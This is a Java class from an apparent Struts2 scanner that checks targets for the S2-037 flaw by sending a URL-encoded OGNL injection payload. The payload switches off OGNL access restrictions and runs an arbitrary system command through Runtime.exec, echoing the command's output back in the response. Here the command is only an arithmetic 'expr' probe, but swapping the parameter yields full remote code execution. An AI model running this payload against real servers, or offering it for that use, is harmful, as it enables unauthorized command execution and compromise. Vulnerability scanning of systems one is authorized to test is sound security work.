package struts2scan.payload;

import struts2scan.util.HttpClient;
import struts2scan.util.HttpResult;

import java.net.URL;
import java.util.Random;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class S2_037 implements Check {
    public String printInfo(){
        String info = "[+] S2-037:影响版本Struts 2.3.20-2.3.28.1; GET请求发送数据";
        return info+"\n";
    }

    @Override
    public boolean check(URL url) throws Exception {
        return false;
    }


    @Override
    public boolean check(String protocol, String host, int port,String path) throws Exception {

        int number1 = new Random(10000).nextInt(10000);
        int number2 = new Random(10000).nextInt(10000);
        String poc = "%23_memberAccess%3d%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%2c%23process%3d%40java.lang.Runtime%40getRuntime().exec(%23parameters.command%5b0%5d)%2c%23ros%3d(%40org.apache.struts2.ServletActionContext%40getResponse().getOutputStream())%2c%40org.apache.commons.io.IOUtils%40copy(%23process.getInputStream()%2c%23ros)%2c%23ros.flush()%2c%23xx%3d123%2c%23xx.toString.json?command=expr%20"+number1+"%20%2B%20"+number2;


        if (path==null){
            path = "/";
        }else if(!path.endsWith("/")){
            path = path+"/";
        }

        String url = protocol + "://" + host + ":" + port + path  +poc;

        int number = number1+number2;

        HttpResult result = HttpClient.get(url);
        Pattern p = Pattern.compile(String.valueOf(number));
        Matcher m = p.matcher(result.getData());

        if (m.find()) {
            return true;
        } else {
            return false;
        }

    }


}
